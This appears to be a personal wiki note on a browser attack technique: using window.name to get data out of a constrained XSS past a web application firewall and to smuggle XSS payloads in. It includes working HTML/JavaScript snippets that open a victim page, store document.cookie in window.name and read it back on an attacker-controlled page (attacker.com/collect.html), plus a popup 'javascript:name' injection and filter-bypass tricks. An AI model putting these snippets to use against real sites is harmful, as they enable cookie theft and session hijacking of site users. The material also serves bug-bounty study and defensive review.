---
title: window.name Persistence for WAF-Invisible Exfil
slug: window-name-exfil
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/dom-xss, technique/waf-bypass, technique/exfil]
inbound: []
---

# window.name Persistence for WAF-Invisible Exfil

## Pattern

`window.name` is a string property on every browsing context that
**persists across same-tab navigations** between origins. A WAF inspecting
request bodies, query strings, and URL fragments never sees `window.name`
because it never leaves the client. Two attack uses:

1. **Exfil out of a constrained XSS**: a payload that achieves JS
   execution but cannot make outbound function calls (WAF blocks
   parentheses / backticks / `fetch`) can still leak data by assigning:
   `name = document.cookie`. From an attacker-controlled tab that opened
   the victim tab, the attacker reads `victimTab.name` after a redirect.

2. **Smuggle exploit payload IN**: the attacker page sets
   `popup.name = '<svg onload=alert(1)>'` before navigating the popup
   to `javascript:name`. The Javascript URL returns `window.name`'s value
   as the document content - full XSS, no payload bytes in the URL.

## Preconditions

- For exfil: attacker controls the window that opened the victim tab
  (i.e. used `window.open` or a `target=` link).
- For inbound: target page accepts a `javascript:` URL or otherwise
  evaluates a string the attacker can compute as `name`.
- Both: same browsing-context group (popup chain or iframe ancestry).

## Detection

- Whitebox: any sink that reads `window.name` and renders it (innerHTML,
  document.write).
- Blackbox: when a WAF blocks the obvious `document.cookie` exfil in an
  XSS, attempt `name = document.cookie` followed by tab redirect.

## Triggering

### Exfil out (attacker page -> victim XSS -> back to attacker)

```html
<!-- attacker.com -->
<script>
const victim = window.open('https://victim.com/xss-sink?p=NAME%3DDOCUMENT.COOKIE');
// payload on victim sets: name = document.cookie
setTimeout(() => {
  victim.location = 'https://attacker.com/collect.html';
  // after redirect, attacker.com is same window; read victim.name
}, 3000);
</script>
```

```html
<!-- attacker.com/collect.html -->
<script>console.log(window.name); // leaked cookie</script>
```

### Smuggle in (attacker page -> popup with payload)

```html
<!-- attacker.com -->
<script>
const popup = window.open('about:blank', 'p');
popup.name = '<svg/onload=alert(document.domain)>';
popup.location = 'javascript:name';
// renders the SVG under victim origin (after navigating to a same-origin javascript URL)
</script>
```

Variant - `javascript:1`, `javascript:persistent`, and any global string
literal also become document content on the new page; useful when even
`name` is filtered.

## Bypasses

- `name` is empty string by default - `name + 1` evaluates to `"1"` if the
  WAF blocks numeric literals.
- Combine with [[url-credential-payload-smuggling]] to keep BOTH the
  injection-into-DOM and the exfil channel WAF-invisible.

## Seen in the wild

- {date: 2024-11-14, source: CT Ep 97} - Justin Gardner used `name = document.cookie` to leak cookies from a constrained DOM-XSS where the WAF blocked all function calls.

## References

- PortSwigger - `window.name` documentation and historical XSS uses.
- Critical Thinking Podcast Ep 97 - <https://www.youtube.com/watch?v=m5mR6dvhtpg>
- Related: [[javascript-uri-name-payload]], [[url-credential-payload-smuggling]], [[waf-bypass]]
